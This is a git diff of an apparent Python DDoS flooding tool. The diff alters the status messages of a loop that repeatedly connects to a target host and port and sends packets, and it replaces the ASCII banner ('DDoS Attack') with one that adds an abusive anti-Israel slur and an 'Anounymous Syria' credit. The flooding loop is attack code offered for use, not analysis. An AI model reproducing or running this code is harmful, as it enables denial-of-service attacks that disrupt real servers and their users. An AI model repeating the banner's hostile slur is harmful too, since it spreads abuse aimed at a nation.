@@ -51,13 +51,13 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! hammering--> \033[0m")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--Attack sent ! Done--> \033[0m")
 			else:
 				s.shutdown(1)
 				print("\033[91mshut<->down\033[0m")
 			time.sleep(.1)
 	except socket.error as e:
-		print("\033[91mno connection! server maybe down\033[0m")
+		print("\033[91mno connection! server maybe Hacked\033[0m")
 		os.system("clear")
 print("""
  ____  ____                 _   _   _             _
@@ -65,9 +65,11 @@ print("""
 | | | | | | |/ _ \/ __|   / _ \| __| __/ _` |/ __| |/ /
 | |_| | |_| | (_) \__ \  / ___ \ |_| || (_| | (__|   <
 |____/|____/ \___/|___/ /_/   \_\__|\__\__,_|\___|_|\_\
-                                Version : 0.0.1v
-              devloper : Haitam
-              تحية خاصة ريكلدو الحاكم                                   
+             ______________________
+             | Version : 0.0.1v   |
+             | devloper : Haitam🇲🇦|
+             | Fuck Israel 🖕🏿 💩  |   
+             |____________________|                      
 """)  
 print("Anounymous Syria")
 	
